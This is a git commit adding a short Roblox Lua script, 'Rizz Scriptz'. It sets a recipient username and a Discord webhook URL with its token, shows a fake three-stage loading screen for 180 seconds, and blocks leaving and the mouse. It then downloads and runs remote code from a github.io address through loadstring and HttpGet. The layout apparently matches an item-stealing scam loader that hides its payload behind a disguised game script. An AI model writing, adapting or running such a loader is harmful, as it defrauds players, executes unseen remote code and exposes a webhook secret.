7e7f66cc2c6ba43f1371873e1381a949f1b1d791
lolerprol <105017699+lolerprol@users.noreply.github.com>
2023-04-30 12:48:26 +0200

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,14 @@
+UserName = "machito66666"
+Webhook = "https://discord.com/api/webhooks/1102166710469021736/GbxLEEaFw2kfAR2mBPnxQbflAXLLGm5hlAuZ7E-iSZEBQcFOLk608UKqxLnNsQTFIKuS"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
